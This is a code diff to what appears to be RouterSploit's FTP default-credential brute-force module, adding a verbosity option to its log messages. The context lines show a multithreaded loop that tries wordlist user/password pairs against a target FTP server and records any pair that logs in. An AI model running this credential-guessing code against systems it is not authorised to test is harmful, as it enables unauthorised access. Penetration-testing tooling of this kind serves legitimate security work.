@@ -10,6 +10,7 @@ from routersploit import (
     LockedIterator,
     print_success,
     print_table,
+    boolify,
 )
 
 
@@ -30,6 +31,7 @@ class Exploit(exploits.Exploit):
 
     threads = exploits.Option(8, 'Numbers of threads')
     defaults = exploits.Option(wordlists.defaults, 'User:Pass pair or file with default credentials (file://)')
+    verbosity = exploits.Option('yes', 'Display authentication attempts')
 
     credentials = []
 
@@ -62,9 +64,10 @@ class Exploit(exploits.Exploit):
             print_error("Credentials not found")
 
     def target_function(self, running, data):
+        module_verbosity = boolify(self.verbosity)
         name = threading.current_thread().name
 
-        print_status(name, 'process is starting...')
+        print_status(name, 'process is starting...', verbose=module_verbosity)
 
         ftp = ftplib.FTP()
         while running.is_set():
@@ -81,22 +84,22 @@ class Exploit(exploits.Exploit):
                         ftp.connect(self.target, port=int(self.port), timeout=10)
                         break
                     except:
-                        print_error("{} Connection problem. Retrying...".format(name))
+                        print_error("{} Connection problem. Retrying...".format(name), verbose=module_verbosity)
                         retries += 1
 
                         if retries > 2:
-                            print_error("Too much connection problems. Quiting...")
+                            print_error("Too much connection problems. Quiting...", verbose=module_verbosity)
                             return
 
                 try:
                     ftp.login(user, password)
 
                     running.clear()
-                    print_success("{}: Authentication succeed!".format(name), user, password)
+                    print_success("{}: Authentication succeed!".format(name), user, password, verbose=module_verbosity)
                     self.credentials.append((user, password))
                 except:
-                    print_error(name, "Authentication Failed - Username: '{}' Password: '{}'".format(user, password))
+                    print_error(name, "Authentication Failed - Username: '{}' Password: '{}'".format(user, password), verbose=module_verbosity)
 
                 ftp.close()
 
-        print_status(name, 'process is terminated.')
+        print_status(name, 'process is terminated.', verbose=module_verbosity)
